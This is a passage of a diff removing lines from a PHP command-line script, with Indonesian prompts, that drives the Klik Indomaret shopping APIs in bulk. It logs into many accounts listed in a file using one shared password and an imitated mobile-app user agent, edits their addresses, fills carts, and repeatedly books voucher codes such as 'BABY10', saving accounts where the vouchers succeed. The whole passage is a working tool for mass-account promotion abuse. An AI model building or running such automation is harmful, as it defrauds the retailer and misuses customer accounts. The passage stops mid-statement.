-				$postalamat = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/InsertAddress?mfp_id=' . $respid, '{"ID":"00000000-0000-0000-0000-000000000000","AddressTitle":"Rumah","CustomerID":"' . $ID . '","Phone":"' . $nomor . '","Street":"Jalan ' . $modelhp . '","Street2":"","Street3":"","District":"' . $distrik . '","ZipCode":"' . $zipcone . '","IsDefault":true,"ProvinceId":"' . $ProvinsiID . '","CityId":"' . $KecamatanID . '","Region":"' . $KotaID . '","CityLabel":"' . $Kecamatan . '","ProvinceName":"' . $Provinsi . '","RegionName":"' . $Kota . '","DistrictId":"' . $KelurahanID . '","ReceiverName":"' . $FName . ' ' . $LName . '","ReceiverPhone":"' . $nomor . '","GoogleAddress":""}', $kuntul2);
-				if (strpos($postalamat[1], '"Message":"success"')) {
-					echo @color('green', "SUKSES ISI ALAMAT\n");
-				} else {
-					echo @color('red', "{$postalamat[1]}\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		unlink('nganue.txt');
-		break;
-	case '11':
-		masal3sxa:
-		echo @color('yellow', "Masukkan Password : ");
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal3sxa;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$getaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-				if ($getaddress[1] == '[]') {
-					echo @color('red', "ALAMAT KOSONG\n");
-				} else {
-					$addidx = json_decode($getaddress[1]);
-					$addid = $addidx[0]->ID;
-					$delete = curlx('https://account-api-v2.klikindomaret.com/api/Customer/DeleteAddress?customerID=' . $ID . '&id=' . $addid . '&mfp_id=' . $respid, null, $kuntul2);
-					echo @color('green', "{$delete[1]}\n");
-				}
-				$no++;
-			} else {
-				echo @color('red', "{$responx}\n");
-			}
-		}
-		unlink('nganue.txt');
-		break;
-	case '12':
-		masalxvx:
-		echo "[+] Masukkan Password: ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxvx;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$vocer = trim($akunxx[1]);
-			tempelllza:
-			$kodetokox = "TB01";
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curl('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetokox . '","StoreCodeDest":""}', $kuntul2);
-					echo "{$setaddress[1]}\n";
-					$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetokox . '&AddressType=0&CustomerAddressID=00000000-0000-0000-0000-000000000000&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-					for ($i = 0; $i < 2; $i++) {
-						$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=2&pId=9c14783e-4920-4193-b2ea-c9e63e4e5e69&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetokox . '&StoreCodeDest=', null, $kuntul);
-						$stt = json_decode($addproduk[1])[0]->Message;
-						$SCID = json_decode($addproduk[1])[0]->ResponseID;
-						echo @color('green', "{$stt}\n");
-						$addproduk2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=2&pId=e946f2ae-96ba-457b-94f3-b1bd978ef14c&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetokox . '&StoreCodeDest=', null, $kuntul);
-						$stt2 = json_decode($addproduk2[1])[0]->Message;
-						$SCID = json_decode($addproduk[1])[0]->ResponseID;
-						echo @color('green', "{$stt2}\n");
-					}
-					echo @color('blue', "OTW REDEEM VOCER KLIK ... \n");
-					$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . urut(16) . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-						echo @color('yellow', "Akun berhasil disimpan di akunklikbervocer.txt\n");
-						save("{$nomor}\n", "akunklikbervocer.txt");
-					} elseif (strpos($kupon[1], 'ShopingCart tidak boleh kosong')) {
-						goto tempelllza;
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-					#########################################
-					echo @color('blue', "OTW REDEEM BABY10 ... \n");
-					$datane = '{"Code":"BABY10","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . urut(16) . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-						echo @color('yellow', "Akun berhasil disimpan di akunklikbervocer.txt\n");
-						save("{$nomor}\n", "akunklikbervocerBABY10.txt");
-					} elseif (strpos($kupon[1], 'ShopingCart tidak boleh kosong')) {
-						goto tempelllza;
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			$no++;
-		}
-		break;
-	case '13':
-		searchproduk:
-		echo @color('nevy', "Search Key: ");
-		$key = trim(fgets(STDIN));
-		$key = urlencode($key);
-		$ch = curl_init();
-		curl_setopt($ch, CURLOPT_URL, 'https://api-catalog.klikindomaret.com/api/Product/GetPaging?regionID=353801d5-28d6-4190-9b2d-327e89c4d98f&Page=1&PageSize=50&SortCol=Latest&SortDir=DESC&SearchKey=' . $key . '&StartPrice=&EndPrice=&USERID=023e5448-2442-4e0b-af57-250ee44f2e84&mfp_id=111a355f-7fd1-46ab-aa24-803f7e97d9b9&StoreCode=T71T&platform=ANDROID&addressType=1&latitude=-2.994048&longitude=104.820175&StoreCodeDest=&WarehouseCode=TMDD&WarehouseDCICode=TWPG&WarehouseMitraCode=&IsLogin=true&Client=KLIK');
-		curl_setopt($ch, CURLOPT_RETURNTRANSFER, 1);
-		curl_setopt($ch, CURLOPT_CUSTOMREQUEST, 'GET');
-		$headers = array();
-		$headers[] = 'Content-Type: application/json';
-		$headers[] = 'Connection: close';
-		$headers[] = 'Accept-Encoding: gzip, deflate';
-		$headers[] = 'User-Agent: okhttp/3.12.1';
-		curl_setopt($ch, CURLOPT_HTTPHEADER, $headers);
-		$result = curl_exec($ch);
-		if (curl_errno($ch)) {
-			echo 'Error:' . curl_error($ch);
-		}
-		curl_close($ch);
-		$sttr = json_decode($result);
-		$json = json_decode($result);
-		pilihprodukx:
-		$ajgjuga = json_decode($result, true);
-		$listno = 0;
-		$pocerAmbil = array();
-		$nominalAmbil = array();
-		foreach ($ajgjuga[0]["ProductList"] as $pocer) {
-			$pocernyah = $pocer['Description'];
-			$pocerid = $pocer['ID'];
-			$harga = $pocer['ValidPrice'];
-			echo @color('nevy', "[{$listno}]");
-			echo ". ";
-			echo @color('yellow', "{$pocernyah} ");
-			echo @color('green', "=>> Rp {$harga}");
-			echo "\n";
-			$listno = $listno + 1;
-		}
-		echo @color('nevy', "JIKA TIDAK ADA ATAU MERUBAH PENCARIAN KETIK : ");
-		echo @color('red', "x\n");
-		echo @color('yellow', "PILIH PRODUK : ");
-		$pilihproduk = trim(fgets(STDIN));
-		if ($pilihproduk == 'x') {
-			goto searchproduk;
-		} else {
-			$produk = @$ajgjuga[0]["ProductList"][$pilihproduk]["ID"];
-		}
-		echo @color('yellow', "JUMLAH : ");
-		$qty = trim(fgets(STDIN));
-		masal2xxx:
-		echo "Masukkan kode toko: ";
-		$kodetoko = trim(fgets(STDIN));
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masal2xxx;
-		}
-		$lines = file($file, FILE_IGNORE_NEW_LINES);
-		print_r($lines);
-		echo "Start baris ke : ";
-		$start = trim(fgets(STDIN));
-		echo "Sampai baris ke : ";
-		$endd = trim(fgets(STDIN));
-		$filex = retrieveText($file, $start, $endd);
-		$list = explode("\n", str_replace("\r", "", $filex));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					if ($scid !== []) {
-						$SCID = $scid;
-					}
-					$getaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-					if ($getaddress[1] == '[]') {
-						$addid = '00000000-0000-0000-0000-000000000000';
-					} else {
-						$addidx = json_decode($getaddress[1]);
-						$addid = $addidx[0]->ID;
-						$longe = $addidx[0]->Longitude;
-						$late = $addidx[0]->Latitude;
-					}
-					$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetoko . '","StoreCodeDest":""}', $kuntul2);
-					// echo "$setaddress[1]\n";
-					$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetoko . '&AddressType=0&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-					$addproduk = curlx('https://api.klikindomaret.com/api/ShoppingCart/ModifyCart?regionID=' . $RegionId . '&scId=&cId=' . $ID . '&cartRef=mobile&mod=add&id=&isPair=false&mfp_id=' . $respid . '&qty=' . $qty . '&pId=' . $produk . '&Origin=Android&NearestStoreLocation=&ChildDOB=&CustomerLatitude=&CustomerLongitude=&StoreCode=' . $kodetoko . '&StoreCodeDest=', null, $kuntul);
-					if (strpos($addproduk[1], '"Success":true')) {
-						$SCID = json_decode($addproduk[1])[0]->ResponseID;
-						$stt = json_decode($addproduk[1])[0]->Message;
-						echo @color('green', "{$stt}\n");
-					} else {
-						$stt = json_decode($addproduk[1])[0]->ErrorMessage;
-						$stt1 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyOrder;
-						$stt2 = json_decode($addproduk[1])[0]->ResponseObject->Items[0]->QtyAvailable;
-						echo @color('red', "{$stt}\n");
-						echo @color('red', "Jumlah Order : {$stt1}\n");
-						echo @color('red', "Jumlah Stock : {$stt2}\n");
-					}
-					$DEVICE_ID = urut(16);
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					$tokonejon = $json[0]->CheckStockModel->StoreCode;
-					$tokonejon1 = $json[0]->CheckStockModel->StoreName;
-					$tokonejon2 = $json[0]->CheckStockModel->StoreAddress;
-					$storeid = $json[0]->CheckStockModel->StoreID;
-					$RegionID = $json[0]->CheckStockModel->RegionID;
-					$DistrictID = $json[0]->CheckStockModel->DistrictID;
-					$gettoko = curlx('https://api.klikindomaret.com/api/Store/GetAllStoreByCode?storeCode=' . $kodetoko . '&customerLatitude=-6.78542505&customerLongitude=112.19929015', null, $kuntul);
-					$ZipCode = json_decode($gettoko[1])[0]->ZipCode;
-					echo @color('nevy', "KODE TOKO : {$tokonejon}\n");
-					echo @color('nevy', "NAMA TOKO : {$tokonejon1}\n");
-					echo @color('nevy', "ALAMAT TOKO : {$tokonejon2}\n");
-					foreach ($json[0]->CartItemNotification->Items as $mydata) {
-						$cx = $mydata;
-						foreach ($cx->ShoppingCartItems as $myxxx) {
-							$idne = $myxxx->Quantity;
-							$prduk = $myxxx->ProductDescription;
-							echo @color('yellow', "{$prduk} == {$idne}\n");
-						}
-					}
-				}
-			} else {
-				echo "{$responx}\n";
-			}
-			$no++;
-		}
-		echo @color('yellow', "TAMBAH LAGI (y / n )? ");
-		$againx = trim(fgets(STDIN));
-		if (strtolower($againx) == 'y') {
-			goto pilihprodukx;
-		}
-		break;
-	case '14':
-		masalxccxx:
-		echo "Masukkan kode toko: ";
-		$kodetoko = trim(fgets(STDIN));
-		echo "Masukkan Password : ";
-		$password = trim(fgets(STDIN));
-		echo "[+] Input File: ";
-		$file = trim(fgets(STDIN));
-		echo @color('yellow', "DAFTAR HIDANGAN :\n");
-		echo @color('red', "[1] Antar\n");
-		echo @color('yellow', "[2] Ambil\n");
-		echo @color('yellow', "pilih : ");
-		$ambil = trim(fgets(STDIN));
-		if ($ambil == '1') {
-			goto khususantar;
-		}
-		echo @color('yellow', "TANGGAL Ambil : ");
-		$tgle = trim(fgets(STDIN));
-		echo @color('yellow', "BULAN Ambil : ");
-		$blne = trim(fgets(STDIN));
-		echo @color('yellow', "JAM AMBIL :\n");
-		echo @color('yellow', "[1] 07:00-07:59\n");
-		echo @color('yellow', "[2] 08:00-08:59\n");
-		echo @color('yellow', "[3] 09:00-09:59\n");
-		echo @color('yellow', "[4] 10:00-10:59\n");
-		echo @color('yellow', "[5] 11:00-11:59\n");
-		echo @color('yellow', "[6] 12:00-12:59\n");
-		echo @color('yellow', "[7] 13:00-13:59\n");
-		echo @color('yellow', "[8] 14:00-14:59\n");
-		echo @color('yellow', "[9] 15:00-15:59\n");
-		echo @color('yellow', "[10] 16:00-16:59\n");
-		echo @color('yellow', "[11] 17:00-17:59\n");
-		echo @color('yellow', "[12] 18:00-18:59\n");
-		echo @color('yellow', "[13] 19:00-19:59\n");
-		echo @color('yellow', "[14] 20:00-20:59\n");
-		echo @color('yellow', "pilih : ");
-		$jamambil = trim(fgets(STDIN));
-		echo @color('yellow', "DAFTAR HIDANGAN :\n");
-		echo @color('yellow', "[1] Isaku\n");
-		echo @color('yellow', "[2] BCA\n");
-		echo @color('red', "[3] REKPON\n");
-		echo @color('yellow', "[4] MANDIRI\n");
-		echo @color('yellow', "pilih : ");
-		$bayar = trim(fgets(STDIN));
-		khususantar:
-		if (empty($file) || !file_exists($file)) {
-			echo "[+] File not found!\n";
-			goto masalxccxx;
-		}
-		$list = explode("\n", str_replace("\r", "", file_get_contents($file)));
-		$no = 1;
-		$total = count($list) - 1;
-		$success = 0;
-		$error = 0;
-		foreach ($list as $kode) {
-			if (empty($kode)) {
-				continue;
-			}
-			echo "Total: {$no}/{$total}\n";
-			unlink('nganue.txt');
-			$akunxx = explode(';', trim($kode));
-			$nomor = trim($akunxx[0]);
-			$vocer = trim($akunxx[1]);
-			$device_id = trim($akunxx[2]);
-			$kuntul = array();
-			$kuntul[] = 'Content-Type: application/json';
-			$kuntul[] = 'Host: api.klikindomaret.com';
-			$kuntul[] = 'User-Agent: okhttp/3.12.1';
-			$kuntul2x = array();
-			$kuntul2x[] = 'Content-Type: application/json';
-			$kuntul2x[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2x[] = 'Applicationkey: indomaret';
-			$kuntul2x[] = 'Authorization: ';
-			$kuntul2x[] = 'User-Agent: okhttp/3.12.1';
-			$verif = curlx('https://account-api-v2.klikindomaret.com/api/Customer/LoginViaMobileApps?isMobile=true&device_token=2badfdf8-5d76-4c49-81cd-c7c3588eebc4&districtID=2483&TrafficSource=', '{"Email":"' . $nomor . '","Password":"' . $password . '"}', $kuntul2x);
-			$respi = json_decode($verif[1]);
-			$respid = $respi->ResponseID;
-			$idne = $respi->ResponseObject->ID;
-			$toked = $respi->ResponseObject->Token;
-			$kuntul2 = array();
-			$kuntul2[] = 'Content-Type: application/json';
-			$kuntul2[] = 'Host: account-api-v2.klikindomaret.com';
-			$kuntul2[] = 'Applicationkey: indomaret';
-			$kuntul2[] = 'Authorization: Bearer ' . $idne . '#' . $toked;
-			$kuntul2[] = 'User-Agent: okhttp/3.12.1';
-			$cekvcne = curlx('https://account-api-v2.klikindomaret.com/api/Customer/Account?access_token=' . $respid, null, $kuntul2);
-			$responx = $cekvcne[1];
-			if (strpos($responx, '"IsActivated":true')) {
-				$cok = json_decode($responx);
-				$ID = $cok[0]->ID;
-				$RegionId = $cok[0]->RegionId;
-				$getscid = curlx('https://api.klikindomaret.com/api/ShoppingCart/GetLastestShop?customerID=' . $ID . '&regionID=' . $RegionId, null, $kuntul);
-				//echo "$getscid[1]\n";
-				$za = json_decode($getscid[1]);
-				if (strpos($getscid[1], '"Message":"An error has occurred."')) {
-					echo @color('red', "ERROR KAK\n");
-				} else {
-					$scid = $za[0];
-					if ($scid !== []) {
-						$SCID = $scid;
-					}
-					$getaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/GetByCustomerId?custId=' . $ID, null, $kuntul2);
-					if ($getaddress[1] == '[]') {
-						$addid = '00000000-0000-0000-0000-000000000000';
-					} else {
-						$addidx = json_decode($getaddress[1]);
-						$addid = $addidx[0]->ID;
-						$longe = $addidx[0]->Longitude;
-						$late = $addidx[0]->Latitude;
-					}
-					switch ($ambil) {
-						case '1':
-							$setaddress = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=&AddressType=1&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=' . $late . '&CustomerLongitude=' . $longe, null, $kuntul);
-							echo "{$setaddress[1]}\n";
-							break;
-						case '2':
-							$setaddress = curlx('https://account-api-v2.klikindomaret.com/api/CustomerAddress/SetAddressTypeAndDefaultStore?mfp_id=' . $respid . '&isChangeAddress=False&ShoppingCartID=' . $scid, '{"CustomerID":"' . $ID . '","AddressType":0,"StoreCode":"' . $kodetoko . '","StoreCodeDest":""}', $kuntul2);
-							echo "{$setaddress[1]}\n";
-							$setaddress2 = curlx('https://api.klikindomaret.com/api/ShoppingCart/ReCheckStockAllItem?ShoppingCartID=' . $scid . '&StoreCode=' . $kodetoko . '&AddressType=0&CustomerAddressID=' . $addid . '&CustomerID=' . $ID . '&StoreCodeDest=&CustomerLatitude=&CustomerLongitude=', null, $kuntul);
-							$datatoko = json_decode($setaddress2[1])[0];
-							$tokone = $datatoko->ResponseObject->StoreCode;
-							$tokone2 = $datatoko->ResponseObject->StoreName;
-							$tokone3 = $datatoko->ResponseObject->StoreAddress;
-							echo @color('yellow', "Kode Toko: ");
-							echo @color('nevy', "{$tokone}\n");
-							echo @color('yellow', "Toko : ");
-							echo @color('nevy', "{$tokone2} - {$tokone3}\n");
-							foreach ($datatoko->ResponseObject->Items as $mydata) {
-								$barang = $mydata->ProductDesc;
-								$qty = $mydata->QtyAvailable;
-								echo @color('yellow', "Item : ");
-								echo @color('nevy', "{$barang}\n");
-								echo @color('yellow', "Stok : ");
-								echo @color('nevy', "{$qty}\n");
-								if ($qty == '0') {
-									echo @color('red', "STOK KOSONG\n");
-									die;
-								}
-							}
-							break;
-					}
-					$DEVICE_ID = $device_id;
-					$cekk = curlx('https://api.klikindomaret.com/api/ShoppingCart/MyCart?id=&customerId=' . $ID . '&shoppingCartId=' . $SCID . '&regionID=' . $RegionId . '&mfp_id=' . $respid . '&StoreCode=' . $kodetoko . '&platform=ANDROID&NearestStoreLocation=&DeviceID=' . $DEVICE_ID . '&ShoppingcartPromoPackagesID=', null, $kuntul);
-					$json = json_decode($cekk[1]);
-					$tokonejon = $json[0]->CheckStockModel->StoreCode;
-					$tokonejon1 = $json[0]->CheckStockModel->StoreName;
-					$tokonejon2 = $json[0]->CheckStockModel->StoreAddress;
-					$storeid = $json[0]->CheckStockModel->StoreID;
-					$RegionID = $json[0]->CheckStockModel->RegionID;
-					$DistrictID = $json[0]->CheckStockModel->DistrictID;
-					$gettoko = curlx('https://api.klikindomaret.com/api/Store/GetAllStoreByCode?storeCode=' . $kodetoko . '&customerLatitude=-6.78542505&customerLongitude=112.19929015', null, $kuntul);
-					$ZipCode = json_decode($gettoko[1])[0]->ZipCode;
-					echo @color('nevy', "KODE TOKO : {$tokonejon}\n");
-					echo @color('nevy', "NAMA TOKO : {$tokonejon1}\n");
-					echo @color('nevy', "ALAMAT TOKO : {$tokonejon2}\n");
-					foreach ($json[0]->CartItemNotification->Items as $mydata) {
-						$cx = $mydata;
-						foreach ($cx->ShoppingCartItems as $myxxx) {
-							$idne = $myxxx->Quantity;
-							$prduk = $myxxx->ProductDescription;
-							echo "{$prduk} == {$idne}\n";
-						}
-					}
-					cekupon:
-					if ($json[0]->CartItemNotification->ListCouponPotonganTotal == []) {
-						echo @color('red', "KUPON KOSONG KAK\n");
-					} else {
-						$jumlah = count($json[0]->CartItemNotification->ListCouponPotonganTotal);
-						echo @color('yellow', "JUMLAH KUPON NEMPEL : ");
-						echo @color('green', "{$jumlah}\n");
-						foreach ($json[0]->CartItemNotification->ListCouponPotonganTotal as $mydata) {
-							$kupon = $mydata->CouponMask;
-							$desk = $mydata->CouponMekanisme;
-							//echo "Nama Kupon : $kupon\n";
-							echo @color('yellow', "Nama Kupon   : ");
-							echo @color('green', "{$kupon}\n");
-							echo @color('yellow', "Keterangan   : ");
-							echo @color('blue', "{$desk}\n");
-						}
-					}
-					inputvocer2:
-					echo @color('blue', "Tempel kupon : ");
-					echo @color('nevy', "{$vocer}\n");
-					$datane = '{"Code":"' . $vocer . '","ShoppingCartID":"' . $SCID . '","CustomerID":"' . $ID . '","RegionID":"' . $RegionId . '","SalesOrderNo":"","Nominal":"","DeviceID":"' . $DEVICE_ID . '","ShoppingCartPackageID":null}';
-					$kupon = curlx('https://api.klikindomaret.com/api/Voucher/BookingVoucherCoupon?mfp_id=' . $respid, $datane, $kuntul);
-					$kimak = json_decode($kupon[1]);
-					$ket = $kimak->ResponseObject->keterangan;
-					if (strpos($kupon[1], '"status":"SUCCESS"')) {
-						echo @color('green', "BERHASIL GAN\n");
-						echo @color('nevy', "{$ket}\n");
-						echo @color('blue', "{$nomor}\n");
-					} else {
-						echo @color('red', "{$ket}\n");
-					}
-					switch ($ambil) {
-						case '1':
